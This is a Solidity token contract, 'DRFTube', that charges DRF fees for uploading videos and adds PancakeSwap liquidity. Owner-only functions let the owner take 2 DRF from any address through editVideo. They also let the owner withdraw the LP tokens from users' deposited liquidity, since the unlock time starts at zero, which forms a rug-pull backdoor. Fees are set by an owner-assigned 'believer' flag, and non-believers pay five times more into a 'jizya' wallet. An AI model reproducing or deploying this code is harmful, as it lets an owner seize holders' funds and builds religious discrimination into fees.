// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IPancakeRouter02 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IERC20Detailed is IERC20 {
    function decimals() external view returns (uint8);
}

contract DRFTube is ERC20, Ownable {
    mapping(address => uint256) public lastUpload;
    mapping(address => bool) public isBeliever;

    address public zakatWallet;
    address public jizyaWallet;

    IPancakeRouter02 public pancakeRouter;
    address public usdt;
    address public usdc;

    uint256 public liquidityUnlockTime;

    event VideoUploaded(address indexed user, string videoUrl);

    constructor(
        address _zakatWallet,
        address _jizyaWallet,
        address _router,
        address _usdt,
        address _usdc
    ) ERC20("DRFTube", "DRF") {
        _mint(msg.sender, 1_000_000_000_000 * 1e18);
        zakatWallet = _zakatWallet;
        jizyaWallet = _jizyaWallet;
        pancakeRouter = IPancakeRouter02(_router);
        usdt = _usdt;
        usdc = _usdc;
    }

    function setBeliever(address user, bool status) external onlyOwner {
        isBeliever[user] = status;
    }

    function uploadVideo(string calldata videoUrl) external {
        require(block.timestamp - lastUpload[msg.sender] >= 1 days, "Wait 24h");
        lastUpload[msg.sender] = block.timestamp;

        uint256 fee = isBeliever[msg.sender] ? 10 * 1e18 : 50 * 1e18; // 10 or 50 DRF
        _transfer(msg.sender, address(this), fee);

        address target = isBeliever[msg.sender] ? zakatWallet : jizyaWallet;
        _transfer(address(this), target, fee);

        emit VideoUploaded(msg.sender, videoUrl);
    }

    function boostVideo(uint256 amount) external {
        _transfer(msg.sender, address(this), amount);
    }

    function shareReward(address user, uint256 reward) external onlyOwner {
        _transfer(owner(), user, reward);
    }

    function addLiquidity(uint256 tokenAmount, uint256 stableAmount, bool useUSDT) external {
        require(tokenAmount > 0 && stableAmount > 0, "Invalid amount");

        address stableToken = useUSDT ? usdt : usdc;

        _transfer(msg.sender, address(this), tokenAmount);
        IERC20(stableToken).transferFrom(msg.sender, address(this), stableAmount);

        _approve(address(this), address(pancakeRouter), tokenAmount);
        IERC20(stableToken).approve(address(pancakeRouter), stableAmount);

        pancakeRouter.addLiquidity(
            address(this),
            stableToken,
            tokenAmount,
            stableAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function lockLiquidity() external onlyOwner {
        liquidityUnlockTime = block.timestamp + 730 days; // 2 years
    }

    function withdrawLiquidity(address lpToken, uint256 amount) external onlyOwner {
        require(block.timestamp >= liquidityUnlockTime, "Locked");
        IERC20(lpToken).transfer(owner(), amount);
    }

    function editVideo(address user) external onlyOwner {
        _transfer(user, address(this), 2 * 1e18); // editing fee = 2 DRF
        _transfer(address(this), zakatWallet, 2 * 1e18);
    }
}
